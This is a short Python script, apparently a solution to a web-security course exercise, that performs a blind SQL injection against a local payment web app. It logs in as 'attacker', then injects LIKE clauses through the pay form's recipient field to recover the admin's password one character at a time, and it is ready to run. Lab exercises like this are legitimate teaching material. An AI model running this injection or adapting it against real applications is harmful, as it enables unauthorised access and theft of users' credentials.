from requests import codes, Session

LOGIN_FORM_URL = "http://localhost:8080/login"
PAY_FORM_URL = "http://localhost:8080/pay"

def submit_login_form(sess, username, password):
    response = sess.post(LOGIN_FORM_URL,
                         data={
                             "username": username,
                             "password": password,
                             "login": "Login",
                         })
    return response.status_code == codes.ok

def submit_pay_form(sess, recipient, amount):
    # You may need to include CSRF token from Exercise 1.5 in the POST request below 
    response = sess.post(PAY_FORM_URL,
                    data={
                        "recipient": recipient,
                        "amount": amount,
                        "auth-token": sess.cookies["session"]
                    })
    return response.status_code == codes.ok

def sqli_attack(username):
    sess = Session()
    assert(submit_login_form(sess, "attacker", "attacker"))
    prefix = ''
    while True:
        for char in 'abcdefghijklmnopqrstuvwxyz':
            password = prefix + char
            if submit_pay_form(sess, "{}' AND users.password LIKE '{}' --".format(username, password), '0'):
                print(password)
                return password
            elif submit_pay_form(sess, "{}' AND users.password LIKE '{}%' --".format(username, password), '0'):
                prefix = password
                print('constructing in progress:', prefix)
                break
    return 'password not found'

def main():
    sqli_attack("admin")

if __name__ == "__main__":
    main()
